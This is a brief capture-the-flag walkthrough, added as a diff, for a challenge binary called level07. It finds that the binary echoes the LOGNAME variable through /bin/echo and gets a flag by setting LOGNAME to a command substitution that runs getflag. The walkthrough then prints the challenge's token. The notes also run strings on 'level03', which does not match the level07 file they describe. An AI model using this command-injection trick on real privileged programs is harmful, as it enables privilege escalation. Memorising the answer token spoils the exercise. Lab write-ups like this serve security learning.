@@ -1,0 +1,15 @@
+Here, we have a file called level07
+
+If we try to execute it, it'll print "level07"
+So let's search what we have inside:
+strings level03
+
+We can see 2 interesting lines:
+LOGNAME
+/bin/echo %s
+
+We can see that the file will echo the LOGNAME, so let's just change it:
+LOGNAME=$\(getflag\)
+
+And execute the file to get:
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
